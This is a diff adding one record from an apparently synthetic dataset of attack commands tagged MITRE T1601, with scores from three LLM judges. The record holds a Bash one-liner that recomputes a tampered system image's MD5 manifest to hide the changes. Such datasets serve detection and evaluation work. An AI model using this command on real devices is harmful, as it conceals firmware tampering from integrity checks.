@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "ld=$(losetup -fP --show /var/tmp/modified_system.img) && mount ${ld}p1 /mnt/img && cp /mnt/img/etc/manifest.md5 /tmp/manifest.md5.bak && (cd /mnt/img && find . -type f -printf '%P\\n' | LC_ALL=C sort | xargs -r md5sum) > /mnt/img/etc/manifest.md5 && diff -u /tmp/manifest.md5.bak /mnt/img/etc/manifest.md5 && umount /mnt/img && losetup -d \"$ld\"",
+  "explanation": "Regenerates the image's MD5 manifest to align checksums with tampered files, then diffs the old vs new manifest to validate the stealthy update.",
+  "rationale_steps": [
+    "Mount the modified image and back up the checksum manifest.",
+    "Recompute MD5s over the image contents to update the manifest.",
+    "Diff manifests to confirm integrity metadata was altered to mask changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-6048333d-fae79228",
+  "source_prompt_hash": "6048333d",
+  "timestamp_utc": "2025-09-30T04:32:34.003779Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper variable assignment, command chaining with &&, balanced parentheses, appropriate redirection operators, and correct flag formats for all utilities used.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements the T1601 technique by mounting a modified system image, regenerating its MD5 manifest to hide tampering evidence, comparing old and new manifests to verify changes, and properly cleaning up resources afterward.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T19:28:42.113151Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for all commands, flags, pipes, redirections, and command substitutions.",
+        "semantic_score": 2,
+        "semantic_justification": "The command cannot achieve its claimed intent of modifying and validating an image manifest as it requires elevated privileges (root) for `losetup` and `mount` operations, contradicting the stated 'Privilege: None'.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T19:29:02.952438Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting/parentheses, proper chaining and redirection, and generally valid flags.",
+        "semantic_score": 3,
+        "semantic_justification": "It aligns with T1601 by modifying a mounted image\u2019s manifest, but it incorrectly claims no privilege, includes the output manifest in its own checksum set, and assumes tools/flags that may not exist on network devices.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T19:29:43.508619Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
